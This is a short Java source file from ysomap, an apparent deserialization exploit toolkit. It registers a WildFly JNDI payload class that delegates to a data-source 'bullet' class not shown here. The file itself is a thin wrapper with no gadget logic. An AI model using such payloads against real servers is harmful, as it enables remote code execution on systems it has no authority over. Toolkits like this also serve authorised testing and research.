package ysomap.payloads.java.wildfly;

import ysomap.bullets.Bullet;
import ysomap.bullets.wildfly.WildFlyDataSourceBullet;
import ysomap.common.annotation.*;
import ysomap.payloads.AbstractPayload;

/**
 * @author wh1t3p1g
 * @since 2022/9/29
 */
@Payloads
@Targets({Targets.JDK, Targets.JNDI})
@Require(bullets = {"WildFlyDataSourceBullet"}, param = false)
@Dependencies({"org.wildfly:wildfly-connector"})
@Authors({ Authors.WH1T3P1G })
public class WildFlyJndi extends AbstractPayload<Object> {

    @Override
    public Bullet getDefaultBullet(Object... args) throws Exception {
        return WildFlyDataSourceBullet.newInstance(args);
    }

    @Override
    public Object pack(Object obj) throws Exception {
        return obj;
    }
}
